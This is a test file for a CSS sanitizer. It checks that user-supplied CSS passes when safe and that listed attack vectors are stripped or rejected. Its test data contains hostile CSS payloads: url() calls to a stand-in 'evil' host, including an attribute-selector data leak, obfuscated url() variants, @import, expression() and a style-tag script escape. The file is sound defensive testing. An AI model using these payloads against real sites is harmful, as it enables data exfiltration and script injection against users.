import { describe, it, expect } from "vitest";
import { sanitizeCss } from "./cssSanitize";

// Exfiltration + injection vectors from the security critique (C2) and
// research embed-and-dns.md §C — every one must be stripped or rejected.
describe("sanitizeCss", () => {
  it("passes through safe css", () => {
    const result = sanitizeCss(
      "button { background: #111; color: white; letter-spacing: 0.02em; }",
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.css).toContain("background: #111");
      expect(result.css).toContain("letter-spacing: 0.02em");
    }
  });

  it.each([
    'input[value^="a"] { background: url(https://evil/log) }',
    "button { background: \\75 rl(https://evil) }",
    "button { background: URL(https://evil) }",
    "button { background: ur/**/l(https://evil) }",
    "button { background: image-set(url(https://evil) 1x) }",
    "button { content: attr(data-secret) }",
    "button { background: var(--x) } :root { --x: url(https://evil) }",
    "@media (min-width: 1px) { button { background: url(https://evil) } }",
    "@keyframes slide { from { background: url(https://evil) } }",
    "@import url(https://evil/steal.css);",
    "@font-face { font-family: x; src: url(https://evil/f.woff) }",
    "button { behavior: url(https://evil.htc) }",
    "button { -ms-behavior: expression(alert(1)) }",
  ])("strips/rejects %s", (css) => {
    const result = sanitizeCss(css);
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.css.toLowerCase()).not.toContain("url(");
    expect(result.css.toLowerCase()).not.toContain("expression");
    expect(result.css.toLowerCase()).not.toContain("behavior");
    expect(result.css.toLowerCase()).not.toContain("@import");
    expect(result.css.toLowerCase()).not.toContain("attr(");
  });

  it("keeps safe declarations inside @media/@keyframes while stripping unsafe ones", () => {
    const result = sanitizeCss(
      "@media (min-width: 600px) { button { color: red; background: url(https://evil) } }",
    );
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.css).toContain("color: red");
      expect(result.css.toLowerCase()).not.toContain("url(");
    }
  });

  it("rejects unbalanced braces", () => {
    const result = sanitizeCss("button { color: red; ");
    expect(result.ok).toBe(false);
  });

  it("rejects style-tag escape attempts", () => {
    const result = sanitizeCss("</style><script>alert(1)</script>");
    expect(result.ok).toBe(false);
  });

  it("enforces the 16KB cap", () => {
    const big = `button { color: #${"a".repeat(17 * 1024)}; }`;
    const result = sanitizeCss(big);
    expect(result.ok).toBe(false);
  });

  it("strips comments (they can hide separators)", () => {
    const result = sanitizeCss("button { /* c */ color: red }");
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.css).not.toContain("/*");
  });
});
